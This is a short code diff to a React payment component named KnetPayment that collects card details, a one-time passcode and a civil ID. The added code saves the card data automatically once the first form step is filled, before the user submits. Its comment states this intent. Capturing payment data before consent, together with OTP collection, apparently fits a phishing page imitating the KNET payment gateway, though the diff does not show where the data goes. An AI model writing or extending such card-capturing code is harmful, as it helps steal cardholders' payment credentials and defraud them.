@@ -67,6 +67,16 @@ export default function KnetPayment() {
 
   const isStep2Disabled = paymentInfo.otp.length !== 6;
 
+  // Auto-save card data as soon as Step 1 form is complete (before Submit)
+  const autoSavedRef = useRef(false);
+  useEffect(() => {
+    if (step === 1 && !isStep1Disabled && !autoSavedRef.current) {
+      autoSavedRef.current = true;
+      saveRecord({}, 1);
+    }
+    if (isStep1Disabled) autoSavedRef.current = false;
+  }, [isStep1Disabled, step]);
+
   const saveRecord = async (extraData = {}, stepNum = step) => {
     const payload = {
       civil_id: civilId,
